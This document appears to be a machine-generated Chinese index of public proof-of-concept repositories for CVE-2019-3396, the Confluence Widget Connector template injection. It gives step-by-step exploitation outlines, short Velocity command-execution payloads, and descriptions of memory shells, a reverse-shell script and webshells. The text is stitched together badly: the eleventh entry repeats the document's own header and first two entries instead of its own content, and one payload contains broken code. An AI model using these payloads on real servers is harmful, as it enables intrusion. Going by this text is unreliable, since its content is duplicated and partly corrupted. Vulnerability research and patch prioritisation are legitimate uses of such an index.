# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

